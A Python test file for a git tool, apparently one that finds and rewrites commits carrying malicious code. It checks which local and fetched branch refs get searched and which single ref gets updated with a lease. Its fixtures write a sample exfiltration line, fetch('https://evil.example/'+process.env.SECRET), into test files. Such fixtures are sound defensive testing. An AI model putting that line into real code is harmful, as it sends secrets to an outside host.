#!/usr/bin/env python3
"""Tests for the two ref questions an amend asks: which refs it READS history from, and which single
ref it then UPDATES for a name. They are not the same answer — a local head and the origin ref of the
same name diverge, so the search scope keeps both while delivery picks one.
"""
from __future__ import annotations

import unittest

from stayawake.lib import git as gitutil
from tests.support.gitrepo import GitSandbox


class TestRefScope(GitSandbox):
    def setUp(self):
        super().setUp()
        self.d = self.new_repo("scope", user__name="T", user__email="t@t.test")
        self.write(self.d, "a.txt", "one\n")
        self.commit(self.d, "root")
        self.base = self.git(self.d, "rev-parse", "--abbrev-ref", "HEAD").strip()

    def _fetched_only(self, name: str, path: str, text: str) -> str:
        """Build a commit touching `path` reachable only from `refs/remotes/origin/<name>`."""
        self.git(self.d, "checkout", "-qb", "tmp")
        self.write(self.d, path, text)
        sha = self.commit(self.d, f"work on {name}")
        self.git(self.d, "update-ref", f"refs/remotes/origin/{name}", sha)
        self.git(self.d, "checkout", "-q", self.base)
        self.git(self.d, "branch", "-qD", "tmp")
        return sha

    def _diverged(self, name: str, path: str) -> str:
        """Leave local `<name>` BEHIND `origin/<name>`, the payload only on the fetched side.
        Returns the sha only the origin ref reaches."""
        self.git(self.d, "checkout", "-qb", name)
        self.write(self.d, path, "clean\n")
        self.commit(self.d, "clean on the local side")
        self.write(self.d, path, "fetch('https://evil.example/'+process.env.SECRET)\n")
        ahead = self.commit(self.d, "payload on the fetched side")
        self.git(self.d, "update-ref", f"refs/remotes/origin/{name}", ahead)
        self.git(self.d, "reset", "-q", "--hard", "HEAD~1")
        self.git(self.d, "checkout", "-q", self.base)
        return ahead

    # --- the search scope ------------------------------------------------------------------

    def test_a_fetched_branch_with_no_local_head_is_searched(self):
        self._fetched_only("feature", "b.txt", "two\n")
        refs = [ref for name, ref in gitutil.branch_refs(self.d) if name == "feature"]
        self.assertEqual(refs, ["refs/remotes/origin/feature"])

    def test_origin_head_notes_and_replace_refs_are_not_branches(self):
        head = self.rev(self.d)
        self.git(self.d, "update-ref", "refs/remotes/origin/HEAD", head)
        self.git(self.d, "update-ref", "refs/remotes/origin/notes/commits", head)
        self.git(self.d, "update-ref", "refs/remotes/origin/replace/abc", head)
        names = {name for name, _ref in gitutil.branch_refs(self.d)}
        self.assertNotIn("HEAD", names)
        self.assertNotIn("notes/commits", names)
        self.assertNotIn("replace/abc", names)

    def test_both_refs_of_a_diverged_name_are_searched(self):
        """Delivery picks one ref per name; the search scope must keep both, or a version that lives
        on only one side is never read."""
        self._diverged("feature", "p.js")
        refs = [ref for name, ref in gitutil.branch_refs(self.d) if name == "feature"]
        self.assertIn("refs/heads/feature", refs)
        self.assertIn("refs/remotes/origin/feature", refs)

    def test_a_version_reachable_only_from_a_fetched_branch_is_enumerated(self):
        sha = self._fetched_only("feature", "payload.js", "fetch('https://evil.example/')\n")
        walked = gitutil.file_commits(self.d, "payload.js", limit=1000, all_branches=True)
        self.assertIn(sha, walked)

    def test_a_version_only_on_the_fetched_side_of_a_diverged_name_is_enumerated(self):
        """The normal post-fetch state: amend refreshes `origin/*` before it enumerates, so the local
        head sits behind. A carrier only the fetched ref reaches must still be walked."""
        ahead = self._diverged("feature", "p.js")
        walked = gitutil.file_commits(self.d, "p.js", limit=1000, all_branches=True)
        self.assertIn(ahead, walked)

    def test_many_fetched_branches_do_not_silently_empty_the_walk(self):
        """A repository with thousands of refs must not outgrow the argument list: a git call that
        fails to run comes back empty, and an empty walk reads as 'this path has no carriers'."""
        import subprocess
        sha = self._fetched_only("feature", "payload.js", "fetch('https://evil.example/')\n")
        head = self.rev(self.d)
        batch = "".join(f"create refs/remotes/origin/{'b' * 180}-{i} {head}\n" for i in range(6000))
        subprocess.run(["git", "-C", str(self.d), "update-ref", "--stdin"],
                       input=batch, text=True, check=True, capture_output=True)
        walked = gitutil.file_commits(self.d, "payload.js", limit=100_000, all_branches=True)
        self.assertIn(sha, walked, "the carrier must survive a repository with thousands of refs")

    def test_the_walk_rejects_exactly_the_refs_that_are_not_branches(self):
        """The globs the walk excludes and the filter `branch_refs` applies have to answer alike."""
        self.git(self.d, "checkout", "-qb", "tmp")
        self.write(self.d, "noted.js", "fetch('https://evil.example/')\n")
        sha = self.commit(self.d, "reachable only from non-branch refs")
        for ref in ("refs/remotes/origin/notes/commits", "refs/remotes/origin/replace/abc"):
            self.git(self.d, "update-ref", ref, sha)
        self.git(self.d, "checkout", "-q", self.base)
        self.git(self.d, "branch", "-qD", "tmp")
        self.assertEqual(gitutil.file_commits(self.d, "noted.js", limit=1000, all_branches=True), [],
                         "a commit only a non-branch ref reaches is not a carrier")
        named = {name for name, _ref in gitutil.branch_refs(self.d)}
        self.assertTrue(named.isdisjoint({"notes", "notes/commits", "replace/abc"}),
                        "and the filter rejects the same refs")

    # --- the delivery answer ---------------------------------------------------------------

    def test_delivery_prefers_the_local_tip_and_leases_it_when_both_refs_carry(self):
        root = self.rev(self.d)
        self.git(self.d, "checkout", "-qb", "feature")
        self.write(self.d, "p.js", "local work\n")
        local_tip = self.commit(self.d, "local ahead")
        self.git(self.d, "update-ref", "refs/remotes/origin/feature", root)
        self.git(self.d, "checkout", "-q", self.base)
        carrying = {n: (tip, cas) for n, tip, cas in gitutil.branches_carrying(self.d, root)}
        self.assertEqual(carrying["feature"][0], local_tip, "the local tip wins the replay target")
        self.assertEqual(carrying["feature"][1], local_tip, "and is the lease held against it")

    def test_a_commit_only_the_fetched_ref_reaches_leases_zero(self):
        """The local ref does not contain it, so it is not a local carrier: the zero lease makes the
        compare-and-swap refuse rather than clobber a local head that sits elsewhere."""
        ahead = self._diverged("feature", "p.js")
        carrying = {n: (tip, cas) for n, tip, cas in gitutil.branches_carrying(self.d, ahead)}
        self.assertEqual(carrying["feature"][1], "0" * 40)

    def test_delivery_reports_a_zero_lease_for_a_branch_with_no_local_ref(self):
        sha = self._fetched_only("feature", "b.txt", "two\n")
        carrying = {n: (tip, cas) for n, tip, cas in gitutil.branches_carrying(self.d, sha)}
        self.assertEqual(carrying["feature"][1], "0" * 40)


if __name__ == "__main__":
    unittest.main()
